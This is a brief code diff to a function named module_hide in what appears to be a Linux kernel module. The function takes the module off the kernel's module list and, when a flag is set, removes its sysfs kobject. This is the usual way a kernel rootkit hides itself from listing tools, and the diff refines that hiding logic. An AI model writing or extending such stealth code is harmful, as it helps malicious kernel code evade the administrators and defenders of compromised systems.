@@ -24,9 +24,9 @@ void module_hide(void)
 {
 	if (module_hidden == 1) return;
 	module_previous = THIS_MODULE->list.prev;
-	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
 	list_del(&THIS_MODULE->list);
 #if DISABLE_KOBJ
+	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
 	kobject_del(&THIS_MODULE->mkobj.kobj);
 	list_del(&THIS_MODULE->mkobj.kobj.entry);
 #endif
